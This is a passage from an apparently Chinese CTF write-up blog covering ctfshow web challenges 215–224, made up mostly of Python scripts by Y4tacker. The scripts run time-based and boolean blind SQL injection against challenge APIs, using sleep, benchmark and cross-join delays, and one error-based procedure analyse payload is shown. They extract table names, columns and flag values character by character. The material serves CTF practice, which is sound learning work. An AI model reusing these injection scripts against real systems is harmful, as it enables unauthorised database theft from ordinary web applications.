class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaa from ctfshow_flagxc&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1) and &#x27;1&#x27;=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaac from ctfshow_flagxcc&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;&#x27;MQ==&#x27;) or if (ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://1ac9d5a7-5322-4620-80bc-152bec640e26.chall.ctf.show/sapi/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字</span></span><br><span class="line">        <span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 查数据---不能一次查完越到后面越不准确</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabc from ctfshow_flagxccb&quot;</span></span><br><span class="line">        <span class="comment">#flag&#123;7e7c6a3e-a0f8-41cd-b197-1cd-b197-b50f9b3012ab&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,benchmark(3480500,sha(1)),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># time.sleep(0.3)</span></span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>代码水平差，没发现更好的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://13565a40-808d-44fc-8c3f-4823a3ac8779.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line">payload = <span class="string">&quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line">payload = <span class="string">&quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27; limit 1,1&quot;</span></span><br><span class="line">payload = <span class="string">&quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) or if(substr((select right(flagaac,10) from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.7</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;c33829azwa2e7-4f11-bf80-58a77877718e&#125;</span></span><br><span class="line"><span class="comment"># flag&#123;c33829a7-a2e7-4f11-bf80-589 77877718e&#125;</span></span><br><span class="line"><span class="comment"># flag&#123;c33829a7-a2e7-4f11-bf80-58977837718e&#125;</span></span><br><span class="line"><span class="comment"># flag&#123;c33829a7-a2e7-4f11-bf80-58a77877718e&#125;</span></span><br><span class="line"><span class="comment"># bf40</span></span><br><span class="line"><span class="comment"># 8l9a7</span></span><br><span class="line"><span class="comment"># 58a77897718e&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://b9430398-f3af-46cc-a239-fe11a9220619.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27; limit 1,1&quot;</span></span><br><span class="line">payload = <span class="string">&quot;select flagaabc from ctfshow_flagxca&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) or if(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &#123;</span></span><br><span class="line"><span class="comment">#             &#x27;ip&#x27;: f&quot;1) or if(1=1,(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1&quot;,</span></span><br><span class="line"><span class="comment">#             &#x27;debug&#x27;: &#x27;1&#x27;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># r = requests.post(url, data=data, timeout=3)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://36c60781-7da4-45f9-b863-59f914dffa84.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1&quot;</span></span><br><span class="line">payload = <span class="string">&quot;select flagaabcc from ctfshow_flagxcac&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        res += i</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) or if(left((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;j&#125;</span>)=&#x27;<span class="subst">&#123;res&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">3</span>)</span><br><span class="line">            res = res[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>考点是：MySQL利用procedure analyse()函数优化表结构<br>limit后面能跟的也只有这个了似乎</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># http://196cf3fd-f920-4018-a714-662ad61571e9.chall.ctf.show/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.jb51.net/article/99980.htm</span></span><br></pre></td></tr></table></figure><h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6119f221-08cd-4363-88d4-1809bd590024.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字</span></span><br><span class="line">        <span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 查数据---不能一次查完越到后面越不准确</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabc from ctfshow_flaga&quot;</span></span><br><span class="line">        <span class="comment"># flag&#123;b747hfb7-P8e8-</span></span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;u&#x27;</span>: <span class="string">f&quot;concat((if (ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>, sleep(0.05), 2)), 1);&quot;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url, params=params, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>以为是group by的报错注入：<a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">CTF-sql-group by报错注入</a><br>姿势不对，我们用盲注试试，利用正确与错误返回的不同结果注入<br><img src="https://img-blog.csdnimg.cn/20201128093033887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201128093023136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateNum</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num - <span class="number">1</span>):</span><br><span class="line">            res += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库-ctfshow_flagas</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段-flagasabc</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select flagasabc from ctfshow_flagas&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&quot;u&quot;</span>: <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;generateNum(i)&#125;</span>,<span class="subst">&#123;generateNum(<span class="number">1</span>)&#125;</span>))&gt;<span class="subst">&#123;generateNum(mid)&#125;</span>,username,&#x27;a&#x27;)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;data&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;userAUTO&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        res += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>这道题比较骚，我拿扫描器扫描到了有<code>robots.txt</code><br><img src="https://img-blog.csdnimg.cn/20201128094552251.png" alt="在这里插入图片描述"><br><img 